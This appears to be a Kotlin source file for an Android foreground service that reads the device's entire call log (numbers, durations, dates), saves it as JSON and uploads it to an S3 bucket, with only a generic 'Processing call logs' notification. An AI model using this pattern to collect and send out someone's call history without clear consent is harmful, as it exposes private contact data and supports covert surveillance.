package com.example.mycalllogsapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.util.Log
import androidx.core.app.NotificationCompat
import com.amazonaws.mobileconnectors.s3.transferutility.TransferNetworkLossHandler
import java.io.File
import java.util.*
import org.json.JSONArray
import org.json.JSONObject

class CallLogService : Service() {

    private val CHANNEL_ID = "CallLogServiceChannel"

    override fun onCreate() {
        super.onCreate()
        // Initialize TransferNetworkLossHandler
        TransferNetworkLossHandler.getInstance(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Create the notification channel for Android O and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Call Log Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }

        // Create a notification
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Call Log Service")
            .setContentText("Processing call logs...")
            .setSmallIcon(R.drawable.ic_launcher_foreground) // Replace with your own icon
            .build()

        // Start the service in the foreground
        startForeground(1, notification)

        Thread {
            try {
                // Fetch Call Logs
                val callLogs = fetchCallLogs()

                // Save logs to a temporary file
                val file = File(applicationContext.cacheDir, "call_logs_${Date().time}.json")
                file.writeText(callLogs)

                // Upload to S3 using the S3Uploader class
                val s3Uploader = S3Uploader(applicationContext)
                s3Uploader.upload(file)

            } catch (e: Exception) {
                Log.e("CallLogService", "Error processing call logs", e)
            } finally {
                stopSelf()
            }
        }.start()

        return START_STICKY
    }

    private fun fetchCallLogs(): String {
        val callLogs = JSONArray()
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)

        cursor?.use {
            while (it.moveToNext()) {
                val call = JSONObject().apply {
                    put("number", it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)))
                    put("duration", it.getString(it.getColumnIndex(CallLog.Calls.DURATION)))
                    put("date", it.getString(it.getColumnIndex(CallLog.Calls.DATE)))
                }
                callLogs.put(call)
            }
        }

        return callLogs.toString()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
